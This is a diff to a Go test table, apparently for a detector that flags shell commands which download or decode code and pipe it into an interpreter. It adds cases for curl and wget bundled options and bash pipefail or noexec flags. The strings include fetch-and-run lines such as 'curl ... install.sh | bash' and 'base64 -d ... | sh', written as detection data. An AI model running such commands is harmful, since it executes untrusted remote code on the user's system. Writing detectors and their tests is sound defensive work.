@@ -55,11 +55,17 @@ func TestSemanticExecutionPipelinePrerequisiteBoundaries(t *testing.T) {
 		want    bool
 	}{
 		{"curl shell stdin", "curl https://files.invalid/install.sh | bash", curlDownloadExecPrerequisite, true},
+		{"curl shell named option", "curl https://files.invalid/install.sh | bash -o pipefail", curlDownloadExecPrerequisite, true},
+		{"curl bundled separated stdout", "curl -so - https://files.invalid/install.sh | bash", curlDownloadExecPrerequisite, true},
 		{"curl download file", "curl -o install.sh https://files.invalid/install.sh", curlDownloadExecPrerequisite, false},
+		{"curl bundled separated download file", "curl -so install.sh https://files.invalid/install.sh | bash", curlDownloadExecPrerequisite, false},
+		{"curl shell named noexec option", "curl https://files.invalid/install.sh | bash -o noexec", curlDownloadExecPrerequisite, false},
 		{"curl data transform", "curl https://api.invalid/data | jq .", curlDownloadExecPrerequisite, false},
 		{"curl local python script", "curl https://files.invalid/input | python3 local.py", curlDownloadExecPrerequisite, false},
 		{"curl quoted mention", "printf '%s\\n' 'curl https://files.invalid/install.sh | bash'", curlDownloadExecPrerequisite, false},
 		{"wget python stdin", "wget -qO- https://files.invalid/install.py | python3 -", wgetDownloadExecPrerequisite, true},
+		{"wget bundled separated stdout", "wget -qO - https://files.invalid/install.sh | bash", wgetDownloadExecPrerequisite, true},
+		{"wget bundled separated download file", "wget -qO install.sh https://files.invalid/install.sh | bash", wgetDownloadExecPrerequisite, false},
 		{"wget local python script", "wget -qO- https://files.invalid/input | python3 local.py", wgetDownloadExecPrerequisite, false},
 		{"base64 portable file shell stdin", "base64 -d -i payload.b64 | sh", base64DecodeExecPrerequisite, true},
 		{"base64 positional input is not portable", "base64 --decode payload.b64 | sh", base64DecodeExecPrerequisite, false},
